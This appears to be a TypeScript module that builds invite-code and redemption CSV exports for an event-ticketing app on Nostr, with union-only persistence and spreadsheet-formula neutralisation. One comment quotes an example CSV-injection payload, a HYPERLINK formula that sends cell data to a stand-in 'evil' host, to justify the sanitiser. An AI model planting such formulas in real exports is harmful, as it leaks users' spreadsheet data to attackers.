/**
 * Invite exports for organizers who sold tickets OUTSIDE Nostrautica (spec §6.5
 * invite codes; organizer QoL 2026-07-25).
 *
 * The situation this exists for: the organizer took payment somewhere else, so
 * the only identity they hold for a buyer is an EMAIL ADDRESS. They mail out one
 * invite code per buyer and then — days later — need to chase the people who
 * never actually signed up. Nothing in the app could answer "which codes have
 * been used?", so the only options were re-mailing everybody or giving up.
 *
 * The `label` (`invite-1`, `invite-2`, … numbered monotonically across batches
 * off the published list) is the ONLY join key between this app and the
 * organizer's own spreadsheet. Emails never enter the app and never reach a
 * relay — the organizer pairs label↔email on their side, we only ever say which
 * labels are spent. Never put anything personal in a label: the 31601 invite
 * list is PLAINTEXT on relays.
 *
 * Two exports with two very different lifetimes, which is why they are separate
 * things in the UI rather than one "Export" button:
 *
 *   A. Codes for mailing — the nsec codes themselves. These exist ONLY in the
 *      browser session that generated them (Admin holds them in component state
 *      and deliberately never persists them, spec §13.3), so this export dies
 *      with the tab. CSV by default, because the .txt-of-links form drops the
 *      label and is therefore unjoinable against an email list.
 *
 *   B. Who has joined — derived, needs no codes at all, and is the one that has
 *      to work months later. Published 31601 hashes give every label ever
 *      issued; the organizer's own decryptable join requests give the redeemed
 *      invite pubkeys; `inviteHash` maps one onto the other.
 *
 * MONOTONIC USED-SET (the load-bearing part). "Used" is derived from join
 * requests still being retrievable from relays, and gift wraps age out of the
 * backfill horizon. If a redemption ages out, a naive recomputation would flip
 * that label back to UNUSED and the organizer would re-mail somebody who already
 * joined — worse than showing nothing. So: the used-set is unioned into
 * persistent owner-scoped storage and can only ever grow, and "unused" is NEVER
 * persisted as a fact (absence of evidence is not evidence). This is the same
 * shape as the readiness latch, whose bug was precisely that it got REPLACED
 * instead of unioned and that it persisted a negative — `saveInviteReport` unions
 * with what is already stored so no caller is even able to shrink it.
 */
import { inviteHash, isInviteValid, type InviteProof } from "@nostrautica/protocol";
import { npubEncode } from "nostr-tools/nip19";
import { cacheGet, cacheSet } from "$lib/cache/persist.js";
import type { GeneratedInvite } from "./organizer.js";

// ── CSV writing (RFC 4180 + spreadsheet formula neutralisation) ───────────────

/**
 * Leading characters that make Excel / LibreOffice / Google Sheets treat an
 * imported cell as a FORMULA rather than text. `display_name` comes straight
 * from an attacker-controllable kind-0 (or the equally free-text `name` on a
 * join request anyone can send to the public E_inbox), so a value like
 * `=HYPERLINK("http://evil/?"&A1,"click")` would otherwise execute on the
 * organizer's machine the moment they open the export — a CSV-injection
 * exfiltration of exactly the sheet that holds their buyers' email addresses.
 * Tab and CR are in the list because some importers strip leading whitespace
 * before deciding, so `\t=1+1` reaches the formula parser as `=1+1`.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * One CSV cell: neutralised against formula injection, then RFC 4180-quoted.
 *
 * Neutralisation is the single-quote prefix (the widely-deployed mitigation):
 * the value stays readable but no importer evaluates it. Quoting is separate and
 * structural — embedded quotes are doubled, and any value carrying a delimiter,
 * quote or line break is wrapped so it can't break the row/column grid.
 */
export function csvCell(value: string | number | undefined | null): string {
  let s = value === undefined || value === null ? "" : String(value);
  if (FORMULA_LEAD.test(s)) s = `'${s}`;
  if (/["\n\r,]/.test(s)) s = `"${s.replace(/"/g, '""')}"`;
  return s;
}

/** One CSV record. */
export function csvRow(cells: readonly (string | number | undefined | null)[]): string {
  return cells.map(csvCell).join(",");
}

/** A complete CSV document, CRLF-terminated per RFC 4180 (Excel is picky). */
export function csvDocument(
  rows: readonly (readonly (string | number | undefined | null)[])[],
): string {
  return rows.map(csvRow).join("\r\n") + "\r\n";
}

/**
 * UTF-8 BOM, prepended when the CSV is turned into a download. Excel on Windows
 * guesses the local ANSI codepage for a BOM-less CSV, which mangles every
 * accented display name (this app ships Slovak and Czech, so that is the common
 * case, not the exotic one). Kept out of {@link csvDocument} so the builders
 * stay comparable in tests.
 */
// Written as an escape, not the literal character: an invisible U+FEFF in source
// is the kind of thing an editor or a lint autofix silently eats.
export const CSV_BOM = "\uFEFF";

// ── Export A: the codes themselves (session-lifetime) ────────────────────────

/**
 * `label,code,link` — one row per code generated in THIS session. The label is
 * the whole point: it is what the organizer joins against their email list, and
 * it is exactly what the links-only .txt form throws away.
 */
export function codesCsv(invites: readonly GeneratedInvite[]): string {
  return csvDocument([
    ["label", "code", "link"],
    ...invites.map((inv) => [inv.label, inv.nsec, inv.link]),
  ]);
}

/**
 * Links only, one per line — byte-for-byte what the old "Download as .txt"
 * produced. Retained because people pipe it into their own mail-merge scripts.
 */
export function codesTxt(invites: readonly GeneratedInvite[]): string {
  return invites.map((inv) => inv.link).join("\n");
}

// ── Export B: who has joined (derived, permanent) ────────────────────────────

/** One entry of the published 31601 list: the hash, and the organizer's label. */
export interface PublishedInvite {
  /** sha256(invite-pubkey) hex — the published, non-enumerable code identity. */
  h: string;
  label?: string;
}

/** What we know about a redemption. Only ever recorded, never un-recorded. */
export interface UsedRecord {
  /** `created_at` of the join request that redeemed the code (unix seconds). */
  at: number;
  /** The redeemer (hex pubkey). */
  pubkey: string;
  /** Best display name known when this was recorded; never blanked once set. */
  name?: string;
}

/** Redemptions keyed by published hash `h`. */
export type InviteUsage = Record<string, UsedRecord>;

/** The subset of a join request this derivation needs (see PendingRequest). */
export interface UsageObservation {
  attendeePubkey: string;
  invite?: InviteProof;
  rumorCreatedAt: number;
  /** Self-declared name on the join request — untrusted, see FORMULA_LEAD. */
  name?: string;
}

/**
 * Which published codes these join requests prove were redeemed.
 *
 * The proof is VERIFIED (`isInviteValid`), not merely parsed: the invite pubkey
 * becomes public the moment its first join request lands on a relay, so anyone
 * can echo it back in a request of their own. The signature binds the proof to
 * (coordinate, attendee), so verification is what keeps the `used_by` column
 * naming the person who actually held the code. A proof whose hash isn't in
 * `published` is ignored — it belongs to no label we can report on.
 *
 * On two valid requests for one code (single-use, so this is either a re-send or
 * the griefing case above) the EARLIEST wins: the first redemption is the one
 * that got in. Ties break on the lower pubkey so the output is deterministic.
 */
export function observeUsed(
  requests: readonly UsageObservation[],
  published: ReadonlySet<string>,
  coordinate: string,
): InviteUsage {
  const out: InviteUsage = {};
  for (const req of requests) {
    if (!req.invite) continue;
    if (!isInviteValid(req.invite, published, coordinate, req.attendeePubkey)) continue;
    const h = inviteHash(req.invite.invitePubkey);
    const prev = out[h];
    const earlier =
      !prev ||
      req.rumorCreatedAt < prev.at ||
      (req.rumorCreatedAt === prev.at && req.attendeePubkey < prev.pubkey);
    if (!earlier) continue;
    out[h] = {
      at: req.rumorCreatedAt,
      pubkey: req.attendeePubkey,
      ...(req.name ? { name: req.name } : {}),
    };
  }
  return out;
}

/**
 * Union two used-sets. Nothing is ever dropped: a label recorded as used in a
 * previous session stays used even when today's relay scan can no longer see the
 * join request that proved it. Within a key, keep the earlier timestamp (the
 * real redemption moment) and keep a name we already had rather than replacing
 * it with a blank one — a later observation missing the name is a gap in what we
 * fetched, not the attendee going anonymous.
 */
export function mergeUsage(prev: InviteUsage | undefined, next: InviteUsage): InviteUsage {
  const out: InviteUsage = { ...(prev ?? {}) };
  for (const [h, rec] of Object.entries(next)) {
    const old = out[h];
    if (!old) {
      out[h] = rec;
      continue;
    }
    const winner = rec.at < old.at ? rec : old;
    out[h] = { ...winner, name: winner.name ?? old.name ?? rec.name };
  }
  return out;
}

/**
 * Union two issued-lists. The 31601 is replaceable and accumulates across
 * batches, so a fresh fetch normally supersedes the cached copy — but a fetch
 * that came back empty or partial (one unreachable relay) must not erase labels
 * we already knew about, or those codes vanish from the report entirely. Fresh
 * order first (it is the authoritative issue order), then anything only the
 * cache still has.
 */
export function mergeIssued(
  prev: readonly PublishedInvite[] | undefined,
  next: readonly PublishedInvite[],
): PublishedInvite[] {
  const out: PublishedInvite[] = [];
  const seen = new Set<string>();
  for (const inv of next) {
    if (seen.has(inv.h)) continue;
    seen.add(inv.h);
    out.push(inv);
  }
  for (const inv of prev ?? []) {
    if (seen.has(inv.h)) continue;
    seen.add(inv.h);
    out.push(inv);
  }
  return out;
}

/** One row of the "who has joined" report. */
export interface UsageRow {
  label: string;
  used: boolean;
  /** Unix seconds; undefined on unused rows. */
  usedAt?: number;
  /** Undefined on unused rows — there is nobody to name. */
  npub?: string;
  displayName?: string;
}

/** npub for a hex pubkey, falling back to the raw hex if it can't be encoded. */
function safeNpub(pubkey: string): string {
  try {
    return npubEncode(pubkey);
  } catch {
    return pubkey;
  }
}

/**
 * The report: one row per code ever issued, in issue order.
 *
 * `nameOf` resolves a display name from whatever the caller already has warm
 * (directory entry, join request, cached kind-0) — this must not trigger fetches
 * of its own, the report has to render offline. A recorded name is used when the
 * live lookup comes back empty, so a profile that has since aged out of cache
 * doesn't blank a column the organizer already saw.
 *
 * Unused rows carry NO identity columns at all, rather than a placeholder: the
 * whole point of "unused only" is that it is mail-mergeable as-is.
 */
export function buildUsageRows(
  issued: readonly PublishedInvite[],
  used: InviteUsage,
  nameOf?: (pubkey: string) => string | undefined,
): UsageRow[] {
  return issued.map((inv) => {
    // An unlabelled entry is possible (the 31601 schema makes `label` optional,
    // and a list could have been written by another tool). Fall back to a short
    // hash so the row is still addressable instead of silently anonymous.
    const label = inv.label ?? inv.h.slice(0, 12);
    const rec = used[inv.h];
    if (!rec) return { label, used: false };
    const name = nameOf?.(rec.pubkey)?.trim() || rec.name?.trim() || undefined;
    return {
      label,
      used: true,
      usedAt: rec.at,
      npub: safeNpub(rec.pubkey),
      ...(name ? { displayName: name } : {}),
    };
  });
}

export type UsageScope = "all" | "unused";

/** Apply the export scope. "unused" is the directly mail-mergeable chase list. */
export function filterUsageRows(rows: readonly UsageRow[], scope: UsageScope): UsageRow[] {
  return scope === "unused" ? rows.filter((r) => !r.used) : [...rows];
}

/** How many of these codes are spent — the number the organizer re-checks. */
export function usedCount(rows: readonly UsageRow[]): number {
  return rows.reduce((n, r) => n + (r.used ? 1 : 0), 0);
}

/**
 * `label,used,used_at,npub,display_name`. Timestamps are ISO 8601 UTC: the file
 * is read by a human in a spreadsheet, and a unix integer is not.
 */
export function usageCsv(rows: readonly UsageRow[]): string {
  return csvDocument([
    ["label", "used", "used_at", "npub", "display_name"],
    ...rows.map((r) => [
      r.label,
      r.used ? "yes" : "no",
      r.usedAt ? new Date(r.usedAt * 1000).toISOString() : "",
      r.npub ?? "",
      r.displayName ?? "",
    ]),
  ]);
}

// ── Persistence (owner-scoped, union-only) ───────────────────────────────────

/**
 * Bumped only if the stored shape changes incompatibly. An unknown version is
 * IGNORED rather than migrated — but note that dropping a used-set is exactly
 * the regression this module exists to prevent, so any future bump must migrate
 * `used` forward rather than start clean.
 */
const CACHE_VERSION = 1;

interface PersistedInviteReport {
  v: number;
  issued: PublishedInvite[];
  used: InviteUsage;
}

// Owner-scoped like every other decrypted admin surface (CACHING-PLAN §2.11):
// this is derived from gift wraps only the organizer can unwrap, and it is wiped
// on logout with the rest of that identity's cache.
function reportKey(coordinate: string): string {
  return `invitereport:${coordinate}`;
}

export interface InviteReport {
  issued: PublishedInvite[];
  used: InviteUsage;
}

/** The stored report for a coordinate (no network), or undefined. */
export function cachedInviteReport(coordinate: string): InviteReport | undefined {
  const hit = cacheGet<PersistedInviteReport>(reportKey(coordinate))?.data;
  if (!hit || hit.v !== CACHE_VERSION) return undefined;
  return { issued: hit.issued ?? [], used: hit.used ?? {} };
}

/**
 * Union `issued`/`used` into what is already stored and persist the result,
 * returning it so the caller renders exactly what is on disk.
 *
 * The union happens HERE, not at the call site, so there is no code path — now
 * or after some future refactor — that can write a smaller used-set than the one
 * it found. That inversion is the whole fix for the class of bug where a latch
 * gets recomputed and assigned instead of grown.
 */
export function saveInviteReport(
  coordinate: string,
  issued: readonly PublishedInvite[],
  used: InviteUsage,
): InviteReport {
  const stored = cachedInviteReport(coordinate);
  const merged: InviteReport = {
    issued: mergeIssued(stored?.issued, issued),
    used: mergeUsage(stored?.used, used),
  };
  cacheSet(
    reportKey(coordinate),
    { v: CACHE_VERSION, ...merged } satisfies PersistedInviteReport,
    Math.floor(Date.now() / 1000),
  );
  return merged;
}

/** A filesystem-safe export filename, scoped to the event so files don't collide. */
export function exportFilename(kind: "codes" | "used", naddr: string, ext: string): string {
  const slug = naddr.replace(/[^a-z0-9]/gi, "").slice(0, 12) || "event";
  return `nostrautica-${kind}-${slug}.${ext}`;
}
